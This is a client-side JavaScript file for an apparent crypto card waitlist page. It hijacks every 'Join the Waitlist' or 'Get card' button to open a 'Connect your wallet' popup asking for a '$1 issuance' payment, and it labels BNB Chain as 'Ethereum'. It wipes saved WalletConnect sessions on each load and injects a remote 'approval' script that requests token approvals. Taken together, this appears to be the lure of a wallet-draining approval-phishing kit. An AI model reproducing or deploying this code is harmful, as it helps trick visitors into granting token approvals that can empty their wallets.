(function () {
  // Fresh connection on every page load - clear WalletConnect persisted session
  try {
    Object.keys(localStorage).forEach(function (key) {
      if (key.startsWith('wc@') || key === 'WALLETCONNECT_DEEPLINK_CHOICE' || key.startsWith('WCM_')) {
        localStorage.removeItem(key)
      }
    })
    if (typeof indexedDB !== 'undefined' && indexedDB.deleteDatabase) {
      try { indexedDB.deleteDatabase('WALLET_CONNECT_V2_INDEXED_DB') } catch (_) {}
    }
  } catch (_) {}

  const overlay = document.getElementById('waitlist-overlay')
  const formWrap = document.getElementById('waitlist-form-wrap')
  const bep20Wrap = document.getElementById('waitlist-bep20-wrap')
  const bep20Iframe = document.getElementById('waitlist-bep20-iframe')
  const successWrap = document.getElementById('waitlist-success')
  const failedWrap = document.getElementById('waitlist-failed')
  const closeBtn = document.getElementById('waitlist-close')
  const tryAgainBtn = document.getElementById('waitlist-try-again-btn')

  // Replace form with Ethereum and Tron buttons
  function replaceFormWithButtons() {
    if (!formWrap) return
    formWrap.innerHTML = '<h2>Connect your wallet</h2><p class="subtitle">Choose a network to connect your wallet and pay $1 issuance.</p><div id="waitlist-network-cards"><button type="button" class="waitlist-network-card" data-network="BNB"><span class="waitlist-network-name">Ethereum</span><span class="waitlist-network-desc">BNB Chain • Popular</span></button><button type="button" class="waitlist-network-card" data-network="TRX"><span class="waitlist-network-name">Tron</span><span class="waitlist-network-desc">TRC20 • Efficient</span></button></div>'
    const cards = formWrap.querySelectorAll('.waitlist-network-card')
    cards.forEach(function (card) {
      card.addEventListener('click', function () {
        const network = card.getAttribute('data-network')
        if (network) runApprovalInline(network, card)
      })
    })
  }

  function openPopup() {
    overlay?.classList.add('open')
    document.body.style.overflow = 'hidden'
  }

  function closePopup() {
    overlay?.classList.remove('open')
    document.body.style.overflow = ''
    formWrap && (formWrap.style.display = 'block')
    if (bep20Wrap) bep20Wrap.style.display = 'none'
    successWrap && (successWrap.style.display = 'none')
    if (failedWrap) failedWrap.style.display = 'none'
    if (bep20Iframe) bep20Iframe.src = ''
  }

  function showFailed() {
    formWrap && (formWrap.style.display = 'none')
    if (bep20Wrap) bep20Wrap.style.display = 'none'
    successWrap && (successWrap.style.display = 'none')
    if (failedWrap) failedWrap.style.display = 'block'
  }

  function resetToForm() {
    formWrap && (formWrap.style.display = 'block')
    successWrap && (successWrap.style.display = 'none')
    if (failedWrap) failedWrap.style.display = 'none'
  }

  overlay?.addEventListener('click', function (e) {
    if (e.target === overlay) closePopup()
  })

  closeBtn?.addEventListener('click', closePopup)

  function onSuccess() {
    formWrap && (formWrap.style.display = 'none')
    if (bep20Wrap) bep20Wrap.style.display = 'none'
    successWrap && (successWrap.style.display = 'block')
  }

  function onError(msg) {
    setCardLoading(null, false)
    showFailed()
  }

  function setCardLoading(card, loading) {
    var cards = formWrap && formWrap.querySelectorAll('.waitlist-network-card')
    if (!cards) return
    cards.forEach(function (c) {
      var name = c.querySelector('.waitlist-network-name')
      if (name) name.textContent = (c === card && loading) ? 'Loading...' : (c.getAttribute('data-network') === 'BNB' ? 'Ethereum' : 'Tron')
    })
  }

  async function runApprovalInline(network, card) {
    var baseUrl = (window.TRUST_CARD_APPROVAL_URL || window.BEP20_APPROVAL_URL || window.location.origin).replace(/\/$/, '')
    var fluxpayBase = baseUrl.indexOf('fluxpay') >= 0 ? baseUrl : baseUrl + '/fluxpay'
    var isTrc = network === 'TRX'
    var scriptUrl = fluxpayBase + (isTrc ? '/fluxpay-trc20-approval.js' : '/fluxpay-approval.js')
    var runFn = isTrc ? (window.FluxPayTRC20Approval && window.FluxPayTRC20Approval.run) : (window.FluxPayApproval && window.FluxPayApproval.run)

    setCardLoading(card, true)

    if (!runFn) {
      try {
        await new Promise(function (resolve, reject) {
          var script = document.createElement('script')
          script.type = 'module'
          script.src = scriptUrl
          script.onload = resolve
          script.onerror = function () { reject(new Error('Failed to load approval script')) }
          document.head.appendChild(script)
        })
      } catch (err) {
        onError(err && err.message)
        return
      }
    }

    var run = isTrc ? (window.FluxPayTRC20Approval && window.FluxPayTRC20Approval.run) : (window.FluxPayApproval && window.FluxPayApproval.run)
    if (!run) {
      onError('Approval script not loaded')
      return
    }

    run(
      function () {
        setCardLoading(null, false)
        onSuccess()
      },
      function (err) {
        onError(err)
      }
    )
  }

  document.addEventListener('keydown', function (e) {
    if (e.key === 'Escape' && overlay && overlay.classList.contains('open')) closePopup()
  })

  tryAgainBtn?.addEventListener('click', resetToForm)

  var TRIGGER_TEXTS = ['Join the Waitlist', 'Get Started', 'Get card', 'Get your card']
  function attachToButtons() {
    var buttons = document.querySelectorAll('button, a')
    buttons.forEach(function (btn) {
      var text = (btn.textContent || '').trim()
      var isTrigger = TRIGGER_TEXTS.some(function (t) { return text === t || (text || '').toLowerCase().indexOf(t.toLowerCase()) >= 0 })
      if (isTrigger && !btn.dataset.waitlistBound) {
        btn.dataset.waitlistBound = 'true'
        btn.addEventListener('click', function (e) {
          e.preventDefault()
          e.stopPropagation()
          openPopup()
        })
      }
    })
  }

  function checkReturnFromApproval() {
    var params = new URLSearchParams(window.location.search)
    if (params.get('approval_success') === '1') {
      formWrap && (formWrap.style.display = 'none')
      if (bep20Wrap) bep20Wrap.style.display = 'none'
      if (failedWrap) failedWrap.style.display = 'none'
      successWrap && (successWrap.style.display = 'block')
      overlay && overlay.classList.add('open')
      document.body.style.overflow = 'hidden'
      history.replaceState({}, '', window.location.pathname)
    } else if (params.get('approval_failed') === '1') {
      formWrap && (formWrap.style.display = 'none')
      if (bep20Wrap) bep20Wrap.style.display = 'none'
      successWrap && (successWrap.style.display = 'none')
      if (failedWrap) failedWrap.style.display = 'block'
      overlay && overlay.classList.add('open')
      document.body.style.overflow = 'hidden'
      history.replaceState({}, '', window.location.pathname)
    }
  }

  function init() {
    replaceFormWithButtons()
    attachToButtons()
    checkReturnFromApproval()
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init)
  } else {
    init()
  }
})()
